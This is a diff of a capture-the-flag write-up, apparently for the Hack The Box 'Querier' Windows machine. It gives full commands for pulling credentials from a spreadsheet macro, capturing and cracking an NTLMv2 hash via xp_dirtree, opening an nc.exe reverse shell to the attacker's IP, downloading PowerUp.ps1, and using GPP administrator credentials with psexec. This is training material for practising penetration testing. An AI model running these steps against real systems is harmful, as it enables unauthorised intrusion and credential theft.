@@ -81,6 +81,7 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 19.69 seconds
 ```
+
 Examining the Nmap results we found the following open ports:
 - Port 135 RPC.
 - Ports 139 and 445 related with SMB.
@@ -124,7 +125,9 @@ The file seems to be empty. Let's analyze it with binwalk:
 binwalk -e Currency\ Volume\ Report.xlsm 
 ```
 After running binwalk and analyzing the extracted files, we found some credentials inside the following file:
+
 ```shell
+
 cd '_Currency Volume Report.xlsm.extracted'
 cd xl
 cat vbaProject.bin
@@ -136,18 +139,23 @@ p�      ������  �����   &��     �����   2@
 <SNIP>
 ```
 From it, we could see the following credentials and looking at the queries inside the file also guess that these are the credentials for MSSQL:
+
 ```shell
+
 # Username
 reporting
 # Password
 PcwTWTHRwryjc$c6
 ```
+
 ### Connecting to MSSQL
 We can use the following command to connect to MSSQL using the credentials we found:
+
 ```shell
 impacket-mssqlclient QUERIER/reporting:'PcwTWTHRwryjc$c6'@10.129.142.102 -windows-auth
 ```
 If we try to get a reverse shell using enable_xp_cmdshell, we will get an error telling us that we dont have permission to run it:
+
 ```shell
 SQL (QUERIER\reporting  reporting@volume)> enable_xp_cmdshell
 ERROR: Line 1: You do not have permission to run the RECONFIGURE statement.
@@ -161,11 +169,14 @@ First start impacket-smbserver on Kali:
 ```shell
 impacket-smbserver -smb2support kalishare .
 ```
+
 And then enter the following query on MSSQL with our Kali tun0 IP:
+
 ```shell
 exec xp_dirtree '\\10.10.14.206\kalishare\',1,1
 ```
 After that, we will get the following response on our SMB server:
+
 ```shell
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
@@ -185,8 +196,10 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 [*] User QUERIER\ authenticated successfully
 [*] :::00::aaaaaaaaaaaaaaaa
 ```
+
 ### Cracking the NTLMv2 hash
 Now we can try to crack the hash:
+
 ```shell
 # Copy and save the hash into text file, then save it as hash.txt
 cat hash.txt
@@ -202,6 +215,7 @@ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 john --show --format=netntlmv2 hash.txt
 ```
 We successfully cracked the hash and got the following credentials:
+
 ```shell
 # Username
 mssql-svc
@@ -209,25 +223,31 @@ mssql-svc
 # Password
 corporate568
 ```
+
 Alternatively, we can also crack the hash with hashcat:
+
 ```shell
 hashcat -m 5600 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt hash.txt
 ```
 ### Using mssql-svc credentials and nc.exe to get a reverse shell
 Now we can use the credentials of mssql-svc to access MSSQL:
+
 ```shell
 impacket-mssqlclient QUERIER/mssql-svc:'corporate568'@10.129.187.241 -windows-auth
 ```
 Enable xp_cmdshell entering the following 2 lines on the MSSQL shell, one at a time:
+
 ```shell
 EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
 EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 ```
 We can test if we can run commands now:
+
 ```shell
 xp_cmdshell dir C:\
 ```
 It works!
+
 ```shell
 SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell dir C:\
 output                                                       
@@ -262,6 +282,7 @@ NULL
 ```
 
 Now it's time to move nc.exe and get a reverse shell:
+
 ```shell
 # Start python server on Kali where nc.exe is located
 cp /usr/share/windows-resources/binaries/nc.exe nc.exe
@@ -284,6 +305,7 @@ xp_cmdshell powershell -c nc.exe "10.10.14.206 8443 -e /bin/sh"
 ```
 Note: If we are not getting a response on our Python server, reconnect again with impacket-mssqlclient and the commands again.
 After running the commands above, we will get a response on our nc listener, giving us access as querier\mssql-svc:
+
 ```shell
 listening on [any] 8443 ...
 connect to [10.10.14.206] from (UNKNOWN) [10.129.142.173] 49673
@@ -297,12 +319,14 @@ querier\mssql-svc
 Somehow the machine is super unstable. So we may need to restart the machine multiple times, try again, etc. Or just try waiting patiently for the commands run on the shell.
 ### User Flag
 We can find the user.txt flag at the desktop of the user mssql-svc:
+
 ```shell
 type C:\Users\mssql-svc\Desktop\user.txt
 ```
 # Privilege Escalation
 ### Finding credentials using PowerUp.ps1
 We will move the script PowerUp.ps1 into the target and use it to enumerate it. Let's first move the script into the target:
+
 ```shell
 # On Kali
 # Get PowerUp.ps1
@@ -327,6 +351,7 @@ cd C:\Windows\Temp
 powershell -c iwr http://10.10.14.206:8080/PowerUp.ps1 -OutFile PowerUp.ps1 
 ```
 Now we can run PowerUp.ps1 with the following command:
+
 ```shell
 # Load the script
 . .\PowerUp.ps1
@@ -372,6 +397,7 @@ File      : C:\ProgramData\Microsoft\Group
 Check     : Cached GPP Files
 ```
 The results provided us some credentials for the username Administrator:
+
 ```shell
 # Username
 Administrator
@@ -381,10 +407,12 @@ MyUnclesAreMarioAndLuigi!!1!
 ```
 ### Access as Administrator using impacket-psexec
 We will try to get access as Administrator with impacket-psexec using the credentials we found:
+
 ```shell
 impacket-psexec Administrator:'MyUnclesAreMarioAndLuigi!!1!'@10.129.148.136
 ```
 It worked! We successfully got access as Administrator:
+
 ```shell
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
@@ -403,6 +431,7 @@ nt authority\system
 ```
 ### Root Flag
 Now we can get the root.txt flag:
+
 ```shell
 type C:\Users\Administrator\Desktop\root.txt
 ```
